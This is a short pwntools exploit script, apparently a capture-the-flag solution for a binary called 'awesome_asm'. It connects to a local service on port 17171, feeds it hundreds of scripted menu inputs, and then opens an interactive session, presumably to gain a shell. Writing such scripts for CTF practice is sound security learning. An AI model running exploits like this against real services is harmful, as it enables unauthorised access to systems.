#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'awesome_asm')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

# io = start()
io = remote("localhost", 17171)

for i in range(203):
    io.sendline(b'4')
for i in range(113):
    io.sendline(b'5')
io.sendline(b'3')
io.sendline(b'6')
for i in range(17):
    io.sendline(b'4')
io.sendline(b'1')
io.sendline(b'6')
for i in range(249):
    io.sendline(b'4')
for i in range(272):
    io.sendline(b'5')
io.sendline(b'2')
io.sendline(b'6')
for i in range(119):
    io.sendline(b'4')
for i in range(121):
    io.sendline(b'5')
io.sendline(b'0')

io.interactive()

